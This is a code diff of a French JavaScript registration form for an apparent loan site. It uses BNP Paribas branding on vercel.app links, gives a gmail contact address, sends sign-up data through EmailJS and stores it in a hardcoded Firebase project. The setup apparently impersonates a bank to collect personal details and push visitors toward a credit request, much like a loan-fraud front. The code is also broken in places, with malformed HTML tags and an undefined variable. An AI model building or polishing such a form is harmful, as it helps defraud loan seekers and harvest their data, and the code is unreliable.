@@ -1,5 +1,6 @@
 // La recuperation des elements 
 const form = document.querySelector("#form");
+const currency = document.querySelector('#currencyList');
 const username = document.querySelector('#username');
 const email = document.querySelector('#email');
 const password = document.querySelector('#password');
@@ -13,13 +14,19 @@ var userInfo={
  email:"" ,
  prenom:"",
  pays:"",
+ currency:"",
  username:"",
  password:"",
  password2:"",
   
 }
+userInfo.currency=currency.value
+userInfo.pays=pays.value
 pays.onchange=function (param) {
   userInfo.pays=pays.value
+}
+currency.onchange = function(param) {
+  userInfo.currency = currency.value
 }
 username.onchange=function () {
   if(username.value!=''){
@@ -97,7 +104,45 @@ prenom.onchange=function (param) {
 email.onchange=function () {
   if (email.value!='') {
    const emailTest=email_verify(email.value)
-   console.log(emailTest)
+const uniqUser= 
+verifyUniqueAccount(base,email.value)
+console.log(uniqUser)
+if(uniqUser.isunique==true){
+  console.log(uniqUser)
+  if(uniqUser.amountloan==0){
+    isCompte.style.display='flex'
+    isCompte.innerHTML=
+    
+  `<div class='info'>
+ <div class='btn-close'>
+  <div>*</div>
+  </div>
+  <div class='message'>
+  vous avez déjà de compte chez nous et il ne vous reste qu'une étape pour avoir un crédit financier à la banque.<br>cliquez sur le lien ci dessous 
+   </div>
+  </div>`
+  }
+  else{
+    isCompte.style.display = 'flex'
+    isCompte.innerHTML =
+    
+      `<div class='info'>
+     <div class='btn-close'>
+      <div>*</div>
+      </div>
+      <div class='message'>
+      vous avez déjà de compte chez nous.
+      <br>
+      Connectez vous pour accéder à votre compte bancaire de crédit en cliquant sur le lien ci dessous 
+      <br>
+      <a href='https://bnpparibasinter.vercel.app/account'>Accédez à votre compte bancaire de crédit</a>
+       </div>
+      </div>`
+  }
+}
+else {
+
+}
   if (emailTest===true) {
     userInfo.email=email.value
     email.style.border='2px solid seagreen'
@@ -140,15 +185,17 @@ password2.onchange=function () {
 form.addEventListener('click',e=>{
    
 console.log(userInfo)
-  sucess()
+isfieldComplete(userInfo)
+sucess()
+
 })
 // Fonstions
 
 function sucess(){
  
 if(userInfo.email!="" && userInfo.password!=''&& userInfo.password2!=''&& pays.value!='' && userInfo.prenom!=''&& userInfo.username!=""&& userInfo.password2==userInfo.password){
-  
-  
+  setDataInBase(base)
+  loan(userInfo)
    try {
      // Tab to edit
    
@@ -171,63 +218,67 @@ if(userInfo.email!="" && userInfo.password!=''&& userInfo.password2!=''&& pays.v
       var serviceId = "service_cuzrpno"
       var templateId ="template_nvumdqd"
    
-      isCompte.style.top = '80px'
-      isCompte.style.color='green'
-      isCompte.innerHTML = 'Creation de Compte en cours ....'
+      
+    
       emailjs.send(serviceId, templateId, param).then(function(resp) {
         
         if(resp.status==200){
           console.log(resp)
           isCompte.innerHTML = `
-                
-                        <div> Informations Vérifiées
+   <div class='info'>
+    <div class='btn-close'>
+     <div>*</div>
+     </div>
+     <div class='message'>
+       <div> Informations Vérifiées
                         </div> 
                         <div> Inscription acceptée </div>
                     
                        <div style = "margin: 30px;text-align: center">
                        <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> 
                        </div>
+      </div>
+     </div>             
+                      
                        `
     
-          isCompte.style.color='green'
-          sendMailLoan(loanItem,userInfo)
-        
-      
+        isCompte.style.display='flex'
+        loan(userInfo)
         }
-        
       })
   
 }
  catch (e) {
              isCompte.innerHTML = `
-                   
-                           <div> vous êtes pas connecté à Internet </div>
+           <div class='info'>
+            <div class='btn-close'>
+             <div>*</div>
+             </div>
+             <div class='message'>
+              <div> vous êtes pas connecté à Internet </div>
                        
                           <div style = "margin: 30px;text-align: center">
                           <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> 
                           </div>
+              </div>
+             </div>    
+                   
+                          
                           `
          
-          isCompte.style.top = '150px'
-          
+          isCompte.style.display='flex'
+          loan(userInfo)
           
           setTimeout(function() {
-            isCompte.style.top = '-400px'
-          }, 8000)
+            isCompte.style.display="none"
+          }, 3000)
          }     
     }
     else {
-      console.log(userInfo)
-      isCompte.style.top = '150px'
-    
    
-   setTimeout(function () {
-     isCompte.style.top='-400px'
-   },8000)
-    }
       
 
-
+}
 
 }
 
@@ -255,48 +306,57 @@ function sendMailLoan(item,userGet){
   
       if (resp.status == 200) {
         console.log('bondipanche')
-        setTimeout(function(){
+     
           isCompte.innerHTML = `
-                            
-                                    <div>Vérifications des paramètres du prêt 
-                                    </div> 
-                                    <div> Prêt accepté </div>
-                               <div>
-                               Vous recevez  une Notification par Mail dès que votre compte bancaire de prêt sera accrédité par le montant de prêt demander 
-                               </div>
-                                   <div style = "margin: 30px;text-align: center">
-                                   <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> 
-                                   </div>
+    <div class='info'>
+     <div class='btn-close'>
+      <div>*</div>
+      </div>
+      <div class='message'>
+                                          <div>Vérifications des paramètres du prêt 
+                                          </div> <
+                                          div > Prêt accepté </div> 
+                                          <div>
+                                            Vous recevez une Notification par Mail dès que votre compte bancaire de prêt sera accrédité par le montant de prêt demander <
+                                            /div> <
+                                            div style = "margin: 30px;text-align: center" >
+                                            <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> <
+                                            /div>
+       </div>
+      </div>                        
+
                                    `
-        },2000)
+     
         
-        isCompte.style.top = '0px'
-        isCompte.style.color = 'green'
-        setTimeout(function() {
-          window.location.href = 'https://bnpparibas-nine.vercel.app/signup'
-        }, 8000)
+        isCompte.style.display='flex'
+      
   
   
       }
       else {
-        isCompte.style.top = '1050px'
+ 
      isCompte.innerHTML = `
+     <div class='info'>
+      <div class='btn-close'>
+       <div>*</div>
+       </div>
+       <div class='message'>
+  <div>Vérifications des paramètres du prêt 
+       </div>
+       <div > Prêt non accepté < /div
+       < div >
+      opération échouées.
+  veillez réssayer si le problème persiste contactez le service financier à l'adresse mail suivante <br>
+    reunierprospere@gmail.com
+    </div> 
+    < div style = "margin: 30px;text-align: center" >
+     <istyle="font-size:50px;color:green" class="fa">&#xf058;</i>
+     </div>
+        </div>
+       </div>
                                  
-                                         <div>Vérifications des paramètres du prêt 
-                                         </div> 
-                                         <div> Prêt non accepté </div>
-                                    <div>
-                  opération échouées.
-                  veillez réssayer si le problème persiste contactez le service financier à l'adresse mail suivante 
-                  reunierprospere@gmail.com
-                                    </div>
-                                        <div style = "margin: 30px;text-align: center">
-                                        <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> 
-                                        </div>`
-    setTimeout(function() {
-      
-         isCompte.style.top='-400px'
-        }, 7000)
+`
+  
   
   
   console.log(resp.status)
@@ -327,6 +387,7 @@ function email_verify(email) {
         /^[a-z0-9._-]+@[a-z0-9._-]{2,}\.[a-z]{2,4}$/
     */
     return /^[a-z0-9._-]+@[a-z0-9._-]{2,}\.[a-z]{2,4}$/.test(email);
+
 }
 function password_verify(passeword) {
     return /^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,12}$/.test(passeword);
@@ -376,4 +437,221 @@ let listOpe=true,fetchData=[],formGetUser={},bicselect='',view='',user={email:""
     })
    
 
+var base=[]
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-analytics.js";
+  
+  // TODO: Add SDKs for Firebase products that you want to use
+  // https://firebase.google.com/docs/web/setup#available-libraries
 
+  // Your web app's Firebase configuration
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  const firebaseConfig = {
+    apiKey: "AIzaSyBOttx-HrCl-zk6WztTVG-YiKop7-S8ZZM",
+    authDomain: "icecommerce-73a10.firebaseapp.com",
+    databaseURL: "https://icecommerce-73a10.firebaseio.com",
+    projectId: "icecommerce-73a10",
+    storageBucket: "icecommerce-73a10.appspot.com",
+    messagingSenderId: "128064356219",
+    appId: "1:128064356219:web:1535e38b4ddb461cb987de",
+    measurementId: "G-8QNWLE6HQR"
+  };
+
+  // Initialize Firebase
+  const appi = initializeApp(firebaseConfig);
+  import { getDatabase,ref,child,get,set,update,remove} from "https://www.gstatic.com/firebasejs/10.13.2/firebase-database.js"
+ let sessionEmail = ""
+ let bnpparislisbonne = ""
+
+   
+ const db = getDatabase();
+  const starCountRef = ref(getDatabase());
+  console.log(db)
+  
+  get(child(starCountRef, "bank/bankusers")).then((snapshot) => {
+    if (snapshot.exists()) {
+      
+     base=[...snapshot.val()]
+     
+    } else {
+      console.log("No data available");
+    }
+  }).catch((error) => {
+    console.error(error);
+  });
+  
+ 
+
+     
+   
+ 
+ 
+   
+ 
+ 
+ 
+function isfieldComplete(info) {
+  if (info.email!=''&& info.username!=''&& info.prenom!='' && info.pays!=''&& password.value!=''&& password2.value!='') {
+    
+  }
+  else {
+    smaller[5].style.color = 'red'
+    smaller[5].innerHTML = "Mot de passe ne peut être vide "
+    smaller[4].style.color = 'red'
+    smaller[4].innerHTML = "Mot de passe ne peut être vide "
+    smaller[3].style.color = 'red'
+    smaller[3].innerHTML = " Mot de passe ne peut être vide "
+        smaller[2].style.color = 'red'
+        smaller[2].innerHTML = " Nom ne peut être vide "
+            smaller[1].style.color = 'red'
+            smaller[1].innerHTML = "Email ne peut être vide "
+             smaller[3].style.color = 'red'
+            smaller[3].innerHTML = "Prénom ne peut être vide "
+             
+                
+        
+    console.log(' all Field is vide')
+  }
+}
+
+function verifyUniqueAccount(allUsersInBase, userTest) {
+  const uniqueUserIndex = allUsersInBase.findIndex((user) => user.email == userTest)
+  console.log(uniqueUserIndex)
+  if (uniqueUserIndex > -1) {
+    
+    return { isunique: true, text: "vous avez déjà un compte", amountloan: allUsersInBase[uniqueUserIndex].tot_amount  }
+  }
+  else {
+    return { isunique: false, text: "vous n'avez pas de compte ", amountloan:0 }
+  }
+}
+
+
+function setDataInBase(base){
+       const datamount={...userInfo,...{contrat:"crédit financier",status:300,tot_amount:0,tot_deposit:0,iscredit:0,
+         typeofCompte:0,assurance:0,dure:0
+       }}
+      
+     delete  datamount.password
+       const blockUser = [...base]
+       blockUser.push(datamount)
+       console.log(blockUser)
+      set(ref(db,"bank/bankusers"),blockUser)
+     
+  
+  
+}
+/*base = [{
+    assurance: 30,
+    contrat: "crédit financier ",
+    email: "ger@gmail.com",
+    iscredit: 1,
+    pays: "canada",
+    prenom: "rose",
+    username: "barkley",
+    status: 420,
+    tot_amount: 250,
+    tot_deposit: 40,
+    typeofCompte: 0,
+    currency: "AMD",
+    dure: 0
+
+  }]*/
+
+ 
+ function loan(user) {
+   const uniqTest = verifyUniqueAccount(base, user)
+   if (uniqTest.isunique) {
+     if (Number(uniqTest.amountloan)== 0) {
+       const loanItem = JSON.parse(localStorage.getItem('pretbnpparisbas'))
+       if (loanItem != null &&  loanItem != " ") {
+         isCompte.innerHTML="Vous êtes inscrits déjà et vous avez atteints vos objectifs. votre demande de prêt au préalable vient d'être validé.veillez vous connecter pour vérifier  votre compte de prêt/crédit financier"
+       }
+       else {
+         isCompte.style.display='flex'
+         isCompte.innerHTML=`
+            <div class='info'>
+                                         <div class='btn-close'>
+                                          <div>*</div>
+                                          </div>
+                                          <div class='message'>
+                 vous êtes déjà inscrit (e),ça ne vous qu 'une demande de crédit financier pour finaliser vos projets  <br >
+                   veillez cliquez sur le lien 
+                   <br >
+                   <a href="https://bnpparibasinter.vercel.app/loan">Demande de crédit financier</a>
+                                       </div> 
+                                       <div style = "margin: 30px;text-align: center" >
+                                        <i style="font-size:30px;color:green" class="fa">&#xf058;</i>
+                                        </div>
+                                           </div> < /div>
+         ` 
+       }
+     }
+     else {
+       isCompte.innerHTML=`
+                  <div class='info'>
+                                <div class='btn-close'>
+                                 <div>*</div>
+                                 </div>
+                                 <div class='message'>
+                          Vous êtes inscrits déjà et vous avez atteints vos objectifs. votre demande de prêt au préalable vient d'être validé.veillez vous connecter pour vérifier  votre compte de prêt/crédit financier
+                              </div> 
+                              <div style = "margin: 30px;text-align: center" >
+                               <i style="font-size:30px;color:green" class="fa">&#xf058;</i>
+                               </div>
+                                  </div> </div>
+       
+       `
+   
+     }
+   
+   
+   }
+   else {
+     
+     
+     
+       if (loanItem != null) {
+         
+         isCompte.innerHTML=`
+           <div class='info'>
+                         <div class='btn-close'>
+                          <div>*</div>
+                          </div>
+ <div class='message'>
+  Vous êtes inscrits déjà et vous avez atteints vos objectifs. votre demande de prêt au préalable vient d'être validé.veillez vous connecter pour vérifier  votre compte de prêt/crédit financier
+                       </div> 
+                       <div style = "margin: 30px;text-align: center" >
+                        <i style="font-size:30px;color:green" class="fa">&#xf058;</i>
+                        </div>
+                           </div>
+                        </div>
+         
+         `
+       }
+       else {
+         isCompte.style.display='flex'
+         isCompte.innerHTML=`
+              <div class='info'>
+               <div class='btn-close'>
+                <div>*</div>
+                </div>
+                <div class='message'>
+         Votre inscription a été un succès, ça ne vous qu'une demande de crédit financier pour finaliser vos projets 
+        <br>
+       veillez cliquez sur le lien 
+        <br>
+       <a href='https://bnpparibasinter.vercel.app/loan'>Demande de crédit financier</a>
+             </div> 
+             <div style = "margin: 30px;text-align: center" >
+              <i style="font-size:30px;color:green" class="fa">&#xf058;</i>
+              </div>
+                 </div> 
+                 </div>
+         `
+       }
+       
+     }
+     
+ }
